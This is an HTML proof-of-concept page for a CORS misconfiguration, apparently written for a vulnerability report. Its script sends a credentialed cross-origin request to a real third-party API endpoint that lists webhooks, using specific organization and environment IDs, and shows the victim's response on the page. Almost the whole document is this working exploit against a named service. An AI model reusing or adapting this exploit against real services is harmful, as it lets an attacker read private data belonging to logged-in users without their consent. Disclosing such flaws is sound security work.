<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CORS Misconfiguration - PoC</title>
</head>
<body>
          
       <div id="main-dev">
       	   
       	     <textarea rows=20 cols=30 id='exploit-area'>
       	     </textarea>

       </div>



       <button onclick=cors()>Submit</button>

	   <script>
	   	
           function cors() {
                 
                   let xhr = new XMLHttpRequest();
                   xhr.onreadystatechange = function() {
                     
                       if(this.readyState == 4 && this.status == 200) {

                       	      document.getElementById('exploit-area').innerHTML = this.responseText;
                       }

                   }

                   xhr.open("GET", "https://api.mux.com/system/v1/webhooks?page=1&limit=25&environment_id=ln21jc");
                   xhr.withCredentials = true;
                   xhr.setRequestHeader("X-Mux-Organization-Id", "og3m5t");
                   xhr.setRequestHeader("X-Mux-Environment-Id", "ln21jc");
                   xhr.send();


           }

	   </script>

</body>
</html>